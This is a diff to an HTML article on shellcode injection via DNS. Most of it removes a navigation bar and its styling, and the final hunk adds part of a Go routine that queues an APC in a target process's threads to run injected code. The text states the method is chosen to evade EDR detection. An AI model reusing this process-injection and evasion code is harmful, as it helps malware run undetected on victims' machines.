@@ -121,37 +121,6 @@
             font-weight: bold;
         }
 
-        nav {
-            background-color: #2c2c2c;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 30px;
-            position: sticky;
-            top: 20px;
-            z-index: 100;
-        }
-
-        nav ul {
-            list-style: none;
-            display: flex;
-            flex-wrap: wrap;
-            gap: 15px;
-            padding: 0;
-        }
-
-        nav a {
-            color: var(--primary-color);
-            text-decoration: none;
-            font-size: 0.9em;
-            padding: 8px 15px;
-            border-radius: 5px;
-            transition: background-color 0.3s ease;
-        }
-
-        nav a:hover {
-            background-color: #3a3a3a;
-        }
-
         footer {
             text-align: center;
             padding: 20px 0;
@@ -180,10 +149,6 @@
             h2 {
                 font-size: 1.5em;
             }
-            nav ul {
-                flex-direction: column;
-                gap: 10px;
-            }
         }
     </style>
 </head>
@@ -191,22 +156,6 @@
     <header>
         <h1>Advanced Shellcode Injection via DNS: Addressing Security Challenges and Technical Limitations</h1>
     </header>
-
-    <nav aria-label="Table of Contents">
-        <ul>
-            <li><a href="#abstract">Abstract</a></li>
-            <li><a href="#introduction">Introduction</a></li>
-            <li><a href="#section-1">Section 1: ASLR</a></li>
-            <li><a href="#section-2">Section 2: DEP</a></li>
-            <li><a href="#section-3">Section 3: EDR</a></li>
-            <li><a href="#section-4">Section 4: DNS TXT</a></li>
-            <li><a href="#section-5">Section 5: DNS Monitoring</a></li>
-            <li><a href="#section-6">Section 6: Stability</a></li>
-            <li><a href="#section-7">Section 7: Implementation</a></li>
-            <li><a href="#evaluation">Evaluation</a></li>
-            <li><a href="#conclusion">Conclusion</a></li>
-        </ul>
-    </nav>
 
     <main>
         <section class="section" id="abstract">
@@ -375,4 +324,29 @@
 
     <span class="code-keyword">for</span> {
         <span class="code-keyword">if</span> te.OwnerProcessID == pid { <span class="code-comment">// pid obtained earlier</span>
-            threadHandle, err := <span class="code-keyword">windows</span>.OpenThread(<span cl
+            threadHandle, err := <span class="code-keyword">windows</span>.OpenThread(<span class="code-keyword">windows</span>.THREAD_SET_CONTEXT|<span class="code-keyword">windows</span>.THREAD_SUSPEND_RESUME|<span class="code-keyword">windows</span>.THREAD_GET_CONTEXT, <span class="code-keyword">false</span>, te.ThreadID)
+            <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
+                <span class="code-keyword">continue</span>
+            }
+            <span class="code-keyword">defer</span> <span class="code-keyword">windows</span>.CloseHandle(threadHandle)
+
+            <span class="code-comment">// Queue APC</span>
+            _, err = <span class="code-keyword">windows</span>.QueueUserAPC(remoteAddr, threadHandle, <span class="code-number">0</span>)
+            <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
+                <span class="code-keyword">return</span> fmt.Errorf(<span class="code-string">"error queuing APC: %v"</span>, err)
+            }
+            <span class="code-keyword">break</span>
+        }
+        err = <span class="code-keyword">windows</span>.Thread32Next(snapshot, &te)
+        <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
+            <span class="code-keyword">break</span>
+        }
+    }
+    <span class="code-keyword">return</span> <span class="code-keyword">nil</span>
+}
+</code></pre>
+            <p>This technique replaces <code>CreateRemoteThread</code>, reducing EDR detection likelihood.</p>
+        </section>
+
+        <section class="section" id="section-4">
+            <h2>Section 4: Handling Large Sh
